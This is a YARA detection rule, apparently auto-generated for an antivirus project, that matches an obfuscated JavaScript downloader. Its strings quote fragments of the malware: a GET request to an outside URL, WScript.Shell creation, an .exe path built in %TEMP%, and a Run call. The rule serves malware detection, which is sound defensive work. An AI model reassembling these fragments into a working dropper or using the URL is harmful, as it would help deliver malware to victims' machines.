rule sig_20160330_cefef037b994b49147daa83dcbba3d4a {
  meta:
    description = "datamaliciousorder - file 20160330_cefef037b994b49147daa83dcbba3d4a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d9a7af327023502e62db42569682eb1f528936261acf3a3b02ffddfbaaf7af45"

  strings:
    $s1  = "_QV[_W](\"GET\", \"http://itead-europe.com/k3ias\", false);" fullword ascii
    $s2  = "var _D = function _B0() {return WScript[_AF](\"WScript\"+\".Shell\");}(), _W1 = 11;" fullword ascii
    $s3  = "function _OD(_QF, _AW0){_C = _C * 1; return _QF - _AW0;};" fullword ascii
    $s4  = "if (_QV[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _B() {return _D[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"2wKaMMPZiGDGN.ex\" + \"e\";};" fullword ascii
    $s6  = "function _IT(){return _EZ + \"\";};" fullword ascii
    $s7  = "function _A(_M0){_D[\"Run\"](_M0, _C, _C);};" fullword ascii
    $s8  = "function _G() {return ((_AW == true) && (_AW == _AC)) ? 1 : _C;};" fullword ascii
    $s9  = " while (_WM){" fullword ascii
    $s10 = "function _HC(){return 22;};" fullword ascii
    $s11 = "function _XA()" fullword ascii
    $s12 = "function _M(){return _AF;};" fullword ascii
    $s13 = "return _OD(_LU, _K);" fullword ascii
    $s14 = "function _J(_CX) {var _RH = (1, 2, 3, 4, 5, _CX); return _RH;};" fullword ascii
    $s15 = "var _KP = new this[\"Date\"]();" fullword ascii
    $s16 = "_AC = true; " fullword ascii
    $s17 = "var _AC = false;" fullword ascii
    $s18 = "_AW = true; " fullword ascii
    $s19 = "var _AW = false;" fullword ascii
    $s20 = "var _ZW = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}